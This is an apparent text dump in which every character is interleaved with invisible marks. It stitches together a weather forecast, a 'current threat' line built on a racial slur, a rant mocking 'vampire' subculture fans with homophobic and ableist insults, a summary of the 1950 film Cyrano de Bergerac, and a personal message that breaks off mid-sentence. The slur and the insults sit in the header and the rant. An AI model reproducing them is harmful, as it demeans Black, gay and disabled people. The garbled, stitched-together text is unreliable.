M‚Äéo‚Äén‚Äé ‚Äé0‚Äé5‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéS‚Äéu‚Äén‚Äén‚Äéy‚Äé
6‚Äé1‚Äé¬∞‚Äé
/‚Äé3‚Äé9‚Äé¬∞‚Äé
3‚Äé%‚Äé
N‚ÄéN‚ÄéW‚Äé ‚Äé1‚Äé6‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé0‚Äé6‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéS‚Äéu‚Äén‚Äén‚Äéy‚Äé
6‚Äé2‚Äé¬∞‚Äé
/‚Äé4‚Äé2‚Äé¬∞‚Äé
5‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé ‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé0‚Äé7‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
6‚Äé6‚Äé¬∞‚Äé
/‚Äé5‚Äé0‚Äé¬∞‚Äé
6‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé0‚Äé8‚Äé
A‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
6‚Äé8‚Äé¬∞‚Äé
/‚Äé5‚Äé3‚Äé¬∞‚Äé
3‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé0‚Äé9‚Äé
A‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
7‚Äé1‚Äé¬∞‚Äé
/‚Äé5‚Äé1‚Äé¬∞‚Äé
3‚Äé5‚Äé%‚Äé
S‚ÄéS‚ÄéW‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé1‚Äé0‚Äé
A‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
6‚Äé8‚Äé¬∞‚Äé
/‚Äé4‚Äé9‚Äé¬∞‚Äé
4‚Äé1‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé1‚Äé1‚Äé
S‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
6‚Äé7‚Äé¬∞‚Äé
/‚Äé5‚Äé0‚Äé¬∞‚Äé
5‚Äé8‚Äé%‚Äé
E‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé1‚Äé2‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
6‚Äé4‚Äé¬∞‚Äé
/‚Äé4‚Äé6‚Äé¬∞‚Äé
4‚Äé6‚Äé%‚Äé
N‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

C‚Äéu‚Äér‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äé:‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé.‚Äé ‚Äéüë®üèø‚Äçüî¨

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

V‚Äéa‚Äém‚Äép‚Äéi‚Äér‚Äée‚Äé
I‚Äén‚Äé ‚ÄéS‚Äét‚Äéo‚Äér‚Äéy‚Äét‚Äéo‚Äéw‚Äén‚Äé ‚ÄéV‚Äéi‚Äél‚Äél‚Äéa‚Äég‚Äée‚Äé,‚Äé ‚Äév‚Äéa‚Äém‚Äép‚Äéi‚Äér‚Äée‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äél‚Äéi‚Äét‚Äéh‚Äée‚Äé,‚Äé ‚Äés‚Äée‚Äéd‚Äéu‚Äéc‚Äét‚Äéi‚Äév‚Äée‚Äé,‚Äé ‚Äéh‚Äéy‚Äép‚Äén‚Äéo‚Äét‚Äéi‚Äéc‚Äé ‚Äéc‚Äér‚Äée‚Äéa‚Äét‚Äéu‚Äér‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äér‚Äée‚Äév‚Äée‚Äél‚Äé ‚Äéi‚Äén‚Äé ‚Äéb‚Äéa‚Äéc‚Äéc‚Äéh‚Äéa‚Äén‚Äéa‚Äél‚Äéi‚Äéa‚Äén‚Äé ‚Äép‚Äél‚Äée‚Äéa‚Äés‚Äéu‚Äér‚Äée‚Äé-‚Äés‚Äée‚Äée‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äél‚Äéi‚Äév‚Äée‚Äé ‚Äéw‚Äéi‚Äél‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äée‚Äér‚Äéo‚Äét‚Äéi‚Äéc‚Äé ‚Äéu‚Äén‚Äél‚Äéi‚Äév‚Äée‚Äés‚Äé,‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äéa‚Äéc‚Äét‚Äéu‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéu‚Äés‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äé ‚Äéc‚Äéo‚Äéo‚Äél‚Äé.‚Äé ‚ÄéI‚Äén‚Äé ‚ÄéR‚Äée‚Äéa‚Äél‚Äéi‚Äét‚Äéy‚Äé:‚Äé ‚Äéc‚Äél‚Äéu‚Äém‚Äés‚Äéy‚Äé,‚Äé ‚Äéf‚Äéa‚Äét‚Äé,‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéi‚Äén‚Äée‚Äép‚Äét‚Äé,‚Äé ‚Äés‚Äéa‚Äér‚Äét‚Äéo‚Äér‚Äéi‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéb‚Äél‚Äéi‚Äén‚Äéd‚Äée‚Äéd‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äé-‚Äéu‚Äép‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äés‚Äéo‚Äé ‚Äép‚Äéa‚Äét‚Äéh‚Äée‚Äét‚Äéi‚Äéc‚Äé ‚Äée‚Äév‚Äée‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äég‚Äéo‚Äét‚Äéh‚Äés‚Äé ‚Äéw‚Äéo‚Äén‚Äé'‚Äét‚Äé ‚Äéh‚Äéa‚Äén‚Äég‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äé ‚Äéa‚Äén‚Äéy‚Äém‚Äéo‚Äér‚Äée‚Äé,‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äéw‚Äée‚Äér‚Äée‚Äé ‚Äén‚Äée‚Äév‚Äée‚Äér‚Äé ‚Äéc‚Äéo‚Äéo‚Äél‚Äé.‚Äé ‚ÄéV‚Äéa‚Äém‚Äép‚Äéi‚Äér‚Äée‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äél‚Äé ‚Äér‚Äée‚Äéj‚Äée‚Äéc‚Äét‚Äés‚Äé ‚Äéb‚Äée‚Äén‚Äét‚Äé ‚Äéo‚Äén‚Äé ‚Äéa‚Äéc‚Äéq‚Äéu‚Äéi‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéA‚ÄéI‚ÄéD‚ÄéS‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äél‚Äéi‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äél‚Äéo‚Äéo‚Äéd‚Äé ‚Äéo‚Äéf‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äé'‚Äév‚Äéi‚Äéc‚Äét‚Äéi‚Äém‚Äés‚Äé'‚Äé ‚Äéf‚Äéi‚Äén‚Äég‚Äée‚Äér‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äén‚Äé ‚Äéo‚Äéd‚Äéd‚Äé,‚Äé ‚Äér‚Äée‚Äét‚Äéa‚Äér‚Äéd‚Äée‚Äéd‚Äé ‚Äée‚Äéx‚Äép‚Äér‚Äée‚Äés‚Äés‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚Äéa‚Äé ‚Äéf‚Äée‚Äét‚Äéi‚Äés‚Äéh‚Äé ‚Äé(‚Äéw‚Äéh‚Äéi‚Äéc‚Äéh‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé ‚Äéc‚Äél‚Äéa‚Äéi‚Äém‚Äé ‚Äéi‚Äés‚Äén‚Äé'‚Äét‚Äé ‚Äéa‚Äé ‚Äéf‚Äée‚Äét‚Äéi‚Äés‚Äéh‚Äé)‚Äé.‚Äé

T‚Äéh‚Äée‚Äéy‚Äé ‚Äét‚Äér‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äéb‚Äée‚Äés‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äém‚Äéi‚Äém‚Äéi‚Äéc‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äém‚Äéy‚Äét‚Äéh‚Äéo‚Äél‚Äéo‚Äég‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚Äéc‚Äéo‚Äéu‚Äén‚Äét‚Äée‚Äér‚Äé-‚Äép‚Äéa‚Äér‚Äét‚Äés‚Äé;‚Äé ‚Äéw‚Äéh‚Äée‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéb‚Äéy‚Äé ‚Äés‚Äél‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äés‚Äée‚Äél‚Äév‚Äée‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äéw‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚Äém‚Äéa‚Äék‚Äée‚Äé-‚Äéu‚Äép‚Äé,‚Äé ‚Äéw‚Äée‚Äéa‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äéf‚Äéa‚Äék‚Äée‚Äé-‚Äéf‚Äéa‚Äén‚Äég‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äé""‚Äéf‚Äée‚Äée‚Äél‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚ÄéI‚Äén‚Äén‚Äée‚Äér‚Äé ‚ÄéP‚Äér‚Äée‚Äéd‚Äéa‚Äét‚Äéo‚Äér‚Äé""‚Äé ‚Äéo‚Äér‚Äé ‚Äéb‚Äéy‚Äé ‚Äéa‚Äéc‚Äét‚Äéu‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéd‚Äér‚Äéi‚Äén‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äél‚Äéo‚Äéo‚Äéd‚Äé,‚Äé ‚Äéd‚Äée‚Äép‚Äée‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äée‚Äév‚Äée‚Äél‚Äé ‚Äéo‚Äéf‚Äé ‚Äér‚Äée‚Äét‚Äéa‚Äér‚Äéd‚Äée‚Äéd‚Äén‚Äée‚Äés‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéi‚Äén‚Äéd‚Äéi‚Äév‚Äéi‚Äéd‚Äéu‚Äéa‚Äél‚Äé.‚Äé ‚ÄéE‚Äéi‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéw‚Äéa‚Äéy‚Äé,‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äéa‚Äé ‚Äég‚Äér‚Äée‚Äéa‚Äét‚Äé ‚Äés‚Äéo‚Äéu‚Äér‚Äéc‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äée‚Äép‚Äéi‚Äéc‚Äé ‚Äél‚Äéu‚Äél‚Äéz‚Äé ‚Äéa‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äég‚Äée‚Äén‚Äée‚Äér‚Äéa‚Äél‚Äé ‚Äél‚Äéa‚Äéc‚Äék‚Äé ‚Äéo‚Äéf‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äél‚Äé ‚Äés‚Äék‚Äéi‚Äél‚Äél‚Äés‚Äé ‚Äél‚Äée‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äé ‚Äér‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéo‚Äéb‚Äél‚Äéi‚Äév‚Äéi‚Äéo‚Äéu‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äée‚Äég‚Äéo‚Äét‚Äéi‚Äés‚Äét‚Äéi‚Äéc‚Äéa‚Äél‚Äé.‚Äé

P‚Äéu‚Äét‚Äé ‚Äés‚Äéi‚Äém‚Äép‚Äél‚Äéy‚Äé,‚Äé ‚Äév‚Äéa‚Äém‚Äép‚Äéi‚Äér‚Äée‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äée‚Äém‚Äéo‚Äé ‚Äék‚Äéi‚Äéd‚Äés‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äég‚Äéa‚Äéy‚Äé ‚Äég‚Äée‚Äén‚Äée‚Äé ‚Äét‚Äéu‚Äér‚Äén‚Äée‚Äéd‚Äé ‚Äéu‚Äép‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé1‚Äé.‚Äé ‚ÄéA‚Äés‚Äéi‚Äéd‚Äée‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äéf‚Äéu‚Äér‚Äér‚Äéi‚Äée‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äék‚Äéi‚Äén‚Äé,‚Äé ‚Äé'‚Äév‚Äéa‚Äém‚Äép‚Äéi‚Äér‚Äée‚Äés‚Äé'‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äép‚Äér‚Äéo‚Äéb‚Äéa‚Äéb‚Äél‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äéa‚Äés‚Äéi‚Äée‚Äés‚Äét‚Äé ‚Äég‚Äér‚Äéo‚Äéu‚Äép‚Äé ‚Äéo‚Äéf‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äée‚Äét‚Äéa‚Äél‚Äé ‚Äée‚Äéj‚Äéa‚Äéc‚Äéu‚Äél‚Äéa‚Äét‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äér‚Äéo‚Äél‚Äél‚Äé.‚Äé


(‚Äé(‚Äé ‚ÄéG‚Äéo‚Äét‚Äéh‚Äé ‚ÄéA‚Äén‚Äéd‚Äé ‚ÄéE‚Äém‚Äéo‚Äé'‚Äés‚Äé ‚ÄéE‚Äém‚Äéb‚Äéa‚Äér‚Äér‚Äéa‚Äés‚Äés‚Äéi‚Äén‚Äég‚Äé ‚ÄéL‚Äéi‚Äét‚Äét‚Äél‚Äée‚Äé ‚ÄéS‚Äéi‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéT‚Äéh‚Äéa‚Äét‚Äé ‚ÄéT‚Äéh‚Äée‚Äéy‚Äé ‚ÄéW‚Äéa‚Äén‚Äét‚Äé ‚ÄéN‚Äéo‚Äé ‚ÄéO‚Äén‚Äée‚Äé ‚ÄéT‚Äéo‚Äé ‚ÄéK‚Äén‚Äéo‚Äéw‚Äé ‚ÄéA‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äé)‚Äé)‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

D‚Äéu‚Äér‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé:‚Äé ‚Äé1‚Äé ‚Äéh‚Äéo‚Äéu‚Äér‚Äé,‚Äé ‚Äé5‚Äé3‚Äé ‚Äém‚Äéi‚Äén‚Äéu‚Äét‚Äée‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äé6‚Äé ‚Äés‚Äée‚Äéc‚Äéo‚Äén‚Äéd‚Äés‚Äé.‚Äé1‚Äé:‚Äé5‚Äé3‚Äé:‚Äé0‚Äé6‚Äé
C‚Äéy‚Äér‚Äéa‚Äén‚Äéo‚Äé ‚Äéd‚Äée‚Äé ‚ÄéB‚Äée‚Äér‚Äég‚Äée‚Äér‚Äéa‚Äéc‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äé1‚Äé9‚Äé5‚Äé0‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚Äéa‚Äéd‚Äév‚Äée‚Äén‚Äét‚Äéu‚Äér‚Äée‚Äé ‚Äéc‚Äéo‚Äém‚Äée‚Äéd‚Äéy‚Äé ‚Äéf‚Äéi‚Äél‚Äém‚Äé ‚Äéb‚Äéa‚Äés‚Äée‚Äéd‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äé1‚Äé8‚Äé9‚Äé7‚Äé ‚ÄéF‚Äér‚Äée‚Äén‚Äéc‚Äéh‚Äé ‚ÄéA‚Äél‚Äée‚Äéx‚Äéa‚Äén‚Äéd‚Äér‚Äéi‚Äén‚Äé ‚Äév‚Äée‚Äér‚Äés‚Äée‚Äé ‚Äéd‚Äér‚Äéa‚Äém‚Äéa‚Äé ‚ÄéC‚Äéy‚Äér‚Äéa‚Äén‚Äéo‚Äé ‚Äéd‚Äée‚Äé ‚ÄéB‚Äée‚Äér‚Äég‚Äée‚Äér‚Äéa‚Äéc‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéE‚Äéd‚Äém‚Äéo‚Äén‚Äéd‚Äé ‚ÄéR‚Äéo‚Äés‚Äét‚Äéa‚Äén‚Äéd‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéu‚Äés‚Äée‚Äés‚Äé ‚Äép‚Äéo‚Äée‚Äét‚Äé ‚ÄéB‚Äér‚Äéi‚Äéa‚Äén‚Äé ‚ÄéH‚Äéo‚Äéo‚Äék‚Äée‚Äér‚Äé'‚Äés‚Äé ‚Äé1‚Äé9‚Äé2‚Äé3‚Äé ‚ÄéE‚Äén‚Äég‚Äél‚Äéi‚Äés‚Äéh‚Äé ‚Äéb‚Äél‚Äéa‚Äén‚Äék‚Äé ‚Äév‚Äée‚Äér‚Äés‚Äée‚Äé ‚Äét‚Äér‚Äéa‚Äén‚Äés‚Äél‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéa‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéa‚Äés‚Äéi‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéi‚Äét‚Äés‚Äé ‚Äés‚Äéc‚Äér‚Äée‚Äée‚Äén‚Äép‚Äél‚Äéa‚Äéy‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äéf‚Äéi‚Äél‚Äém‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéi‚Äér‚Äés‚Äét‚Äé ‚Äém‚Äéo‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äép‚Äéi‚Äéc‚Äét‚Äéu‚Äér‚Äée‚Äé ‚Äév‚Äée‚Äér‚Äés‚Äéi‚Äéo‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéE‚Äén‚Äég‚Äél‚Äéi‚Äés‚Äéh‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéR‚Äéo‚Äés‚Äét‚Äéa‚Äén‚Äéd‚Äé'‚Äés‚Äé ‚Äép‚Äél‚Äéa‚Äéy‚Äé,‚Äé ‚Äét‚Äéh‚Äéo‚Äéu‚Äég‚Äéh‚Äé ‚Äét‚Äéh‚Äée‚Äér‚Äée‚Äé ‚Äéw‚Äée‚Äér‚Äée‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äéa‚Äél‚Äé ‚Äée‚Äéa‚Äér‚Äél‚Äéi‚Äée‚Äér‚Äé ‚Äéa‚Äéd‚Äéa‚Äép‚Äét‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äéd‚Äéi‚Äéf‚Äéf‚Äée‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äél‚Äéa‚Äén‚Äég‚Äéu‚Äéa‚Äég‚Äée‚Äés‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äé1‚Äé9‚Äé5‚Äé0‚Äé ‚Äéf‚Äéi‚Äél‚Äém‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äép‚Äér‚Äéo‚Äéd‚Äéu‚Äéc‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéS‚Äét‚Äéa‚Äén‚Äél‚Äée‚Äéy‚Äé ‚ÄéK‚Äér‚Äéa‚Äém‚Äée‚Äér‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéd‚Äéi‚Äér‚Äée‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéM‚Äéi‚Äéc‚Äéh‚Äéa‚Äée‚Äél‚Äé ‚ÄéG‚Äéo‚Äér‚Äéd‚Äéo‚Äén‚Äé.‚Äé ‚ÄéJ‚Äéo‚Äés‚Äé√©‚Äé ‚ÄéF‚Äée‚Äér‚Äér‚Äée‚Äér‚Äé ‚Äér‚Äée‚Äéc‚Äée‚Äéi‚Äév‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéA‚Äéc‚Äéa‚Äéd‚Äée‚Äém‚Äéy‚Äé ‚ÄéA‚Äéw‚Äéa‚Äér‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéB‚Äée‚Äés‚Äét‚Äé ‚ÄéA‚Äéc‚Äét‚Äéo‚Äér‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äés‚Äét‚Äéa‚Äér‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äép‚Äée‚Äér‚Äéf‚Äéo‚Äér‚Äém‚Äéa‚Äén‚Äéc‚Äée‚Äé ‚Äéa‚Äés‚Äé ‚ÄéC‚Äéy‚Äér‚Äéa‚Äén‚Äéo‚Äé ‚Äéd‚Äée‚Äé ‚ÄéB‚Äée‚Äér‚Äég‚Äée‚Äér‚Äéa‚Äéc‚Äé.‚Äé ‚ÄéM‚Äéa‚Äél‚Äéa‚Äé ‚ÄéP‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé ‚Äép‚Äél‚Äéa‚Äéy‚Äée‚Äéd‚Äé ‚ÄéR‚Äéo‚Äéx‚Äéa‚Äén‚Äée‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äéi‚Äéa‚Äém‚Äé ‚ÄéP‚Äér‚Äéi‚Äén‚Äéc‚Äée‚Äé ‚Äép‚Äéo‚Äér‚Äét‚Äér‚Äéa‚Äéy‚Äée‚Äéd‚Äé ‚ÄéC‚Äéh‚Äér‚Äéi‚Äés‚Äét‚Äéi‚Äéa‚Äén‚Äé ‚Äéd‚Äée‚Äé ‚ÄéN‚Äée‚Äéu‚Äév‚Äéi‚Äél‚Äél‚Äée‚Äét‚Äét‚Äée‚Äé.‚Äé

F‚Äéi‚Äél‚Äém‚Äé ‚Äéc‚Äér‚Äée‚Äéd‚Äéi‚Äét‚Äé:‚Äé ‚ÄéM‚Äéi‚Äéc‚Äéh‚Äéa‚Äée‚Äél‚Äé ‚ÄéG‚Äéo‚Äér‚Äéd‚Äéo‚Äén‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

H‚Äéi‚Äé,‚Äé ‚Äée‚Äév‚Äée‚Äér‚Äéy‚Äéo‚Äén‚Äée‚Äé.‚Äé ‚ÄéY‚Äéo‚Äéu‚Äé ‚Äém‚Äéa‚Äéy‚Äé ‚Äéb‚Äée‚Äé ‚Äéw‚Äéo‚Äén‚Äéd‚Äée‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé ‚Äéi‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéw‚Äéh‚Äéy‚Äé ‚ÄéI‚Äé ‚Äéa‚Äém‚Äé ‚Äée‚Äén‚Äée‚Äém‚Äéi‚Äée‚Äés‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéh‚Äéi‚Äém‚Äé.‚Äé ‚ÄéW‚Äée‚Äél‚Äél‚Äé,‚Äé ‚ÄéI‚Äé ‚Äéf‚Äéi‚Äég‚Äéu‚Äér‚Äée‚Äéd‚Äé ‚ÄéI‚Äé ‚Äéw‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äét‚Äée‚Äél‚Äél‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äén‚Äéo‚Äéw‚Äé.‚Äé ‚ÄéF‚Äéo‚Äér‚Äég‚Äéi‚Äév‚Äée‚Äé ‚Äém‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äéc‚Äél‚Äéo‚Äés‚Äéi‚Äén‚Äég‚Äé ‚Äés‚Äét‚Äéa‚Äét‚Äée‚Äém‚Äée‚Äén‚Äét‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äél‚Äéy‚Äé ‚Äél‚Äéo‚Äén‚Äég‚Äé,‚Äé ‚Äéa‚Äés‚Äé ‚ÄéI‚Äé ‚Äéc‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äén‚Äéo‚Äét‚Äé ‚Äéf‚Äéi‚Äén‚Äéd‚Äé ‚Äéa‚Äén‚Äéy‚Äé ‚Äéb‚Äée‚Äét‚Äét‚Äée‚Äér‚Äé ‚Äép‚Äél‚Äéa‚Äéc‚Äée‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äép‚Äéa‚Äés‚Äét‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äée‚Äéx‚Äép‚Äél‚Äéa‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äéy‚Äéo‚Äéu‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äés‚Äét‚Äéa‚Äér‚Äét‚Äée‚Äéd‚Äé ‚Äéw‚Äéh‚Äée‚Äén‚Äé ‚ÄéI‚Äé ‚Äéw‚Äéo‚Äér‚Äék‚Äée‚Äéd‚Äé ‚Äéa‚Äés‚Äé ‚Äéa‚Äé 